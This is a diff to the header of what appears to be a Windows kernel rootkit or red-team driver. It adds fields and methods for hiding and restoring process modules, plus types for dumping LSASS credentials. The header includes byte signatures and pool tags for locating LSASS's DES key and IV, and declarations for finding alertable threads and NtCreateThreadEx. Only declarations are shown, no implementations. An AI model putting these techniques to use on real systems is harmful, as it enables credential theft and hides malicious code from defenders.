@@ -25,6 +25,7 @@ constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
 constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
 constexpr ULONG DES_KEY_TAG1 = 'UUUR';
 constexpr ULONG DES_KEY_TAG2 = 'MSSK';
+constexpr UCHAR VPN_SHIFT = 32;
 
 constexpr UCHAR IvDesKeyLocation[] = { 0x33, 0xC0, 0x48, 0x8D, 0x15, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45 };
 constexpr Pattern IvDesKeyLocationPattern = {
@@ -74,6 +75,7 @@ struct HiddenModuleEntry {
 	wchar_t* ModuleName;
 	ULONG Pid;
 	PebLinks Links;
+	PLIST_ENTRY OriginalEntry;
 	PMMVAD_SHORT VadNode;
 	ULONG OriginalVadProtection;
 };
@@ -95,7 +97,7 @@ struct LsassInformation {
 	KeyInformation DesKey;
 	KeyInformation Iv;
 	SIZE_T Count;
-	Credentials* Creds;
+	IoctlCredentials* Creds;
 };
 
 struct LsassMetadata {
@@ -148,6 +150,9 @@ private:
 
 	_IRQL_requires_max_(APC_LEVEL)
 	PETHREAD FindAlertableThread(_In_ HANDLE pid);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenModuleEntry* moduleEntry);
 
 	_IRQL_requires_max_(APC_LEVEL)
 	NTSTATUS RestoreModule(_In_ HiddenModuleEntry* moduleEntry);
@@ -210,7 +215,7 @@ public:
 	NTSTATUS DumpCredentials(_Out_ SIZE_T* allocationSize);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS GetCredentials(_Inout_ IoctlCredentials* credentials);
+	NTSTATUS GetCredentials(_Inout_ IoctlCredentialsInformation* credentials);
 
 	_IRQL_requires_max_(DISPATCH_LEVEL)
 	bool FoundNtCreateThreadEx() const { return NtCreateThreadEx != NULL; }
